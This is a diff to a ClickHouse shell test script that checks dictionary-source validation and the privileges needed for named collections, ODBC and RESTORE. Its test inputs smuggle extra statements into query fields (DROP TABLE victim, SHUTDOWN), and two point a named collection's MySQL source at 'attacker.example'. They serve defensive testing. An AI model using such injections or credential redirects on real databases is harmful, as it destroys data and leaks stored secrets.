@@ -20,6 +20,7 @@ CUR_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
 nc="${CLICKHOUSE_TEST_UNIQUE_NAME}_mysql"
 user="${CLICKHOUSE_TEST_UNIQUE_NAME}_user"
 replicated_db="${CLICKHOUSE_DATABASE}_replicated"
+atomic_db="${CLICKHOUSE_DATABASE}_atomic"
 
 NOT_SELECT="Only SELECT query can be used as a dictionary"
 DIFFERENT_READING="cannot contain comments, heredocs, typographic quotes or backslashes"
@@ -33,6 +34,7 @@ function cleanup()
     $CLICKHOUSE_CLIENT --query "DROP NAMED COLLECTION IF EXISTS $nc"
     $CLICKHOUSE_CLIENT --query "DROP NAMED COLLECTION IF EXISTS ${nc}_secret"
     $CLICKHOUSE_CLIENT --query "DROP DATABASE IF EXISTS ${replicated_db} SYNC"
+    $CLICKHOUSE_CLIENT --query "DROP DATABASE IF EXISTS ${atomic_db} SYNC"
 }
 trap cleanup EXIT
 cleanup
@@ -109,6 +111,14 @@ check_rejected "Typographic quotes" "$CREATE" "$MYSQL TABLE 't' INVALIDATE_QUERY
 check_rejected "PostgreSQL backslash" "$CREATE" "$POSTGRESQL TABLE 't' UPDATE_FIELD 'value = ''\\\\'' OR updated')" "$DIFFERENT_READING"
 # SQL Server reads `[']` as an identifier in brackets, and the rest as more statements.
 check_rejected "ODBC square brackets" "$CREATE" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't' INVALIDATE_QUERY 'SELECT [''] = 1 DROP TABLE victim SELECT [''] = 1')" "cannot contain square brackets"
+# ClickHouse reads the words after `FORMAT` and `SETTINGS` itself, a database can read them as another statement.
+check_rejected "FORMAT" "$CREATE" "$MYSQL TABLE 't' INVALIDATE_QUERY 'SELECT 1 FORMAT TSV')" "$NOT_SELECT invalidate query"
+check_rejected "SETTINGS" "$CREATE" "$MYSQL TABLE 't' INVALIDATE_QUERY 'SELECT 1 SETTINGS max_threads = 1')" "$NOT_SELECT invalidate query"
+# SQL Server reads `SELECT 1 SHUTDOWN` as `SELECT 1` and `SHUTDOWN`, ClickHouse reads `SHUTDOWN` as an alias.
+check_rejected "ODBC alias without AS" "$CREATE" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't' INVALIDATE_QUERY 'SELECT 1 SHUTDOWN')" "must write the alias \`SHUTDOWN\` with AS"
+check_rejected "ODBC table alias without AS" "$CREATE" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't' INVALIDATE_QUERY 'SELECT 1 FROM t SHUTDOWN')" "must write the alias \`SHUTDOWN\` with AS"
+check_rejected "ODBC alias without AS and a quoted identifier of the same name" "$CREATE" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't' INVALIDATE_QUERY 'SELECT \"SHUTDOWN\" FROM t SHUTDOWN')" "must write the alias \`SHUTDOWN\` with AS"
+check_rejected "ODBC alias with AS and the same alias without AS" "$CREATE" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't' INVALIDATE_QUERY 'SELECT 1 AS SHUTDOWN, 2 SHUTDOWN')" "must write the alias \`SHUTDOWN\` with AS"
 
 echo '--- Every way to create a dictionary from a definition is checked'
 check_rejected "ON CLUSTER" "$CREATE ON CLUSTER test_shard_localhost" "$MYSQL QUERY 'DROP TABLE t')" "$NOT_SELECT source"
@@ -130,10 +140,37 @@ $CLICKHOUSE_CLIENT --query "
     SELECT count() > 0, countIf(create_table_query LIKE '%DROP TABLE victim%')
     FROM system.tables WHERE database = currentDatabase() AND name LIKE 'dict_random_query_%'"
 
+echo '--- A source replaced by Null is not checked'
+# `restore_replace_external_dictionary_source_to_null` replaces the source before the checks: it sends nothing.
+$CLICKHOUSE_CLIENT --restore_replace_external_dictionary_source_to_null=1 --query "
+    CREATE DICTIONARY dict_select_only (id UInt64, value String) PRIMARY KEY id
+        SOURCE($MYSQL QUERY 'SELECT /* hint */ id, value FROM t')) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1)"
+$CLICKHOUSE_CLIENT --query "
+    SELECT create_table_query LIKE '%SOURCE(NULL%', create_table_query LIKE '%hint%'
+    FROM system.tables WHERE database = currentDatabase() AND name = 'dict_select_only'"
+$CLICKHOUSE_CLIENT --query "DROP DICTIONARY IF EXISTS dict_select_only"
+
 echo '--- SELECT is accepted'
 check_accepted "MySQL" "$MYSQL QUERY 'SELECT id, value FROM t WHERE {condition}' UPDATE_FIELD 'updated' INVALIDATE_QUERY 'SELECT max(updated) FROM t')"
 check_accepted "MySQL with expressions" "MYSQL(HOST concat('127.0.0.1', '') PORT 1 USER 'u' PASSWORD 'p' DB 'd' TABLE 't' INVALIDATE_QUERY concat('SELECT ', '1'))"
 check_accepted "PostgreSQL" "$POSTGRESQL TABLE 't' WHERE 'id > 0' UPDATE_FIELD 'updated' INVALIDATE_QUERY 'SELECT max(updated) FROM t')"
+# Without a load: an ODBC source needs the bridge.
+function check_created()
+{
+    local description="$1"
+    local source="$2"
+    local output
+    output=$($CLICKHOUSE_CLIENT --query "
+        CREATE DICTIONARY dict_select_only (id UInt64, value String DEFAULT '' EXPRESSION 'concat(value, ''x'')') PRIMARY KEY id
+            SOURCE(${source}) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1)" 2>&1)
+    if [ -z "$output" ] && [ "$(dictionary_exists)" = "1" ]; then
+        echo "$description: OK"
+    else
+        echo "$description: FAIL, expected a created dictionary, got: $output"
+    fi
+    $CLICKHOUSE_CLIENT --query "DROP DICTIONARY IF EXISTS dict_select_only"
+}
+check_created "ODBC aliases with AS" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't' INVALIDATE_QUERY 'WITH c AS (SELECT max(ts) AS m FROM t) SELECT m AS \"x\", \"m\" AS y FROM c AS c2 ORDER BY m')"
 
 echo '--- A named collection requires the privilege NAMED COLLECTION'
 $CLICKHOUSE_CLIENT --multiquery --query "
@@ -165,16 +202,24 @@ function restore_as_user()
     local source="$2"
     local on_cluster="$3"
     local grant="$4"
+    local settings="${5:-}"
+    local options="${6:-}"
     local backup="Disk('backups', '${CLICKHOUSE_TEST_UNIQUE_NAME}_$((++backup_number))')"
     $CLICKHOUSE_CLIENT --multiquery --query "
         CREATE DICTIONARY dict_select_only (id UInt64, value String) PRIMARY KEY id
             SOURCE(${source}) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1);
         BACKUP DICTIONARY dict_select_only TO ${backup} FORMAT Null;
         DROP DICTIONARY dict_select_only;"
-    $CLICKHOUSE_CLIENT --user "$as_user" --query "
-        RESTORE DICTIONARY ${CLICKHOUSE_DATABASE}.dict_select_only ${on_cluster} FROM ${backup} FORMAT Null" 2>&1 \
+    # shellcheck disable=SC2086
+    $CLICKHOUSE_CLIENT --user "$as_user" $options --query "
+        RESTORE DICTIONARY ${CLICKHOUSE_DATABASE}.dict_select_only ${on_cluster} FROM ${backup} ${settings} FORMAT Null" 2>&1 \
         | grep -qE "necessary to have the grant ${grant}" && echo 1 || echo 0
     dictionary_exists
+    # With the replacement by `Null`, whether the restored source is `NULL`.
+    if [ -n "$settings$options" ]; then
+        $CLICKHOUSE_CLIENT --query "
+            SELECT create_table_query LIKE '%SOURCE(NULL%' FROM system.tables WHERE database = currentDatabase() AND name = 'dict_select_only'"
+    fi
     $CLICKHOUSE_CLIENT --query "DROP DICTIONARY IF EXISTS dict_select_only"
 }
 
@@ -214,6 +259,26 @@ $CLICKHOUSE_CLIENT --query "GRANT SHOW NAMED COLLECTIONS SECRETS ON $nc TO $user
 echo 'With the grant, ON CLUSTER: created'
 create_override_as_user
 $CLICKHOUSE_CLIENT --query "REVOKE SHOW NAMED COLLECTIONS SECRETS ON $nc FROM $user"
+# The hosts that create the dictionary can have a collection that this host does not have, with stored keys that are unknown here.
+echo 'A collection that does not exist on this host, without the grant, ON CLUSTER: denied, not created'
+$CLICKHOUSE_CLIENT --query "GRANT NAMED COLLECTION ON ${nc}_missing TO $user"
+$CLICKHOUSE_CLIENT --user "$user" --distributed_ddl_output_mode=none --query "
+    CREATE DICTIONARY ${CLICKHOUSE_DATABASE}.dict_select_only ON CLUSTER test_shard_localhost (id UInt64, value String) PRIMARY KEY id
+        SOURCE(MYSQL(NAME ${nc}_missing HOST 'attacker.example' TABLE 't')) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1)" 2>&1 \
+    | grep -qE "necessary to have the grant SHOW NAMED COLLECTIONS SECRETS(, NAMED COLLECTION)? ON \`?${nc}_missing\`?\." && echo 1 || echo 0
+dictionary_exists
+# A local `CREATE` does not require it: the query is not sent to other hosts. An `Atomic` database, because the test database can be
+# `Replicated`, which sends the query to its other replicas.
+echo 'A collection that does not exist on this host, without the grant, locally: not denied for the grant, created'
+$CLICKHOUSE_CLIENT --multiquery --query "
+    CREATE DATABASE ${atomic_db} ENGINE = Atomic;
+    GRANT CREATE DICTIONARY ON ${atomic_db}.* TO $user;"
+$CLICKHOUSE_CLIENT --user "$user" --query "
+    CREATE DICTIONARY ${atomic_db}.dict_select_only (id UInt64, value String) PRIMARY KEY id
+        SOURCE(MYSQL(NAME ${nc}_missing HOST 'attacker.example' TABLE 't')) LAYOUT(FLAT()) LIFETIME(0) SETTINGS(dictionary_lazy_load = 1)" 2>&1 \
+    | grep -qE "necessary to have the grant SHOW NAMED COLLECTIONS SECRETS" && echo 1 || echo 0
+$CLICKHOUSE_CLIENT --query "SELECT count() FROM system.tables WHERE database = '${atomic_db}' AND name = 'dict_select_only'"
+$CLICKHOUSE_CLIENT --query "DROP DATABASE ${atomic_db} SYNC"
 echo 'With the grant, the name is an expression: created'
 create_as_user "" "concat('$nc', '')"
 
@@ -243,7 +308,8 @@ echo '--- An ODBC source requires the privilege READ ON ODBC'
 $CLICKHOUSE_CLIENT --multiquery --query "
     CREATE USER ${user}_odbc;
     GRANT CREATE DICTIONARY, DROP DICTIONARY ON ${CLICKHOUSE_DATABASE}.* TO ${user}_odbc;
-    GRANT READ ON DISK TO ${user}_odbc;"
+    GRANT READ ON DISK TO ${user}_odbc;
+    GRANT CLUSTER ON *.* TO ${user}_odbc;"
 function create_odbc_as_user()
 {
     $CLICKHOUSE_CLIENT --user "${user}_odbc" --query "
@@ -257,6 +323,13 @@ echo 'Without the grant: denied, not created'
 create_odbc_as_user
 echo 'Without the grant, RESTORE: denied, not restored'
 restore_as_user "${user}_odbc" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't')" "" "READ ON ODBC"
+# A source replaced by `Null` sends nothing, so it requires nothing, and its queries are not checked.
+echo 'Without the grant, RESTORE replacing the source by Null: restored'
+restore_as_user "${user}_odbc" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't')" "" "READ ON ODBC" "SETTINGS restore_replace_external_dictionary_source_to_null = 1"
+echo 'Without the grant, RESTORE replacing the source by Null with the setting of the session: restored'
+restore_as_user "${user}_odbc" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't')" "" "READ ON ODBC" "" "--restore_replace_external_dictionary_source_to_null=1"
+echo 'Without the grant, RESTORE ON CLUSTER replacing the source by Null: restored'
+restore_as_user "${user}_odbc" "ODBC(CONNECTION_STRING 'DSN=none' TABLE 't')" "ON CLUSTER test_shard_localhost" "READ ON ODBC" "SETTINGS restore_replace_external_dictionary_source_to_null = 1"
 $CLICKHOUSE_CLIENT --query "GRANT READ ON ODBC TO ${user}_odbc"
 echo 'With the grant: created'
 create_odbc_as_user
